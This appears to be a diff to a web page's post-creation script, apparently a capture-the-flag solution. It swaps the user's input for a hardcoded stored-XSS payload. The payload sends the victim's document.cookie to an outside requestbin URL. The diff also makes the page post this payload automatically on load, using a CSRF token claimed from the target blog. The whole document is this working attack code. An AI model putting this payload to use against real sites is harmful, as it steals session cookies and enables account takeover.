@@ -34,11 +34,14 @@
 
 <script>
     async function create_post(){
-        let content = encodeURIComponent(document.getElementById("content").value)
+        let hax = "<script>fetch('https://requestbin.net/r/8g9looxh?q='+document.cookie, { mode: 'no-cors' })</script>";
+        let content = encodeURIComponent(hax)
         let content_hash = CryptoJS.MD5(content).toString();
         await fetch(`http://blog-force.herokuapp.com/claim_csrf_token?token=${content_hash}`);
         document.getElementById("csrf_token").value = content_hash;
         document.getElementById("send").click();
     }
+
+    create_post();
 </script>
 </html>
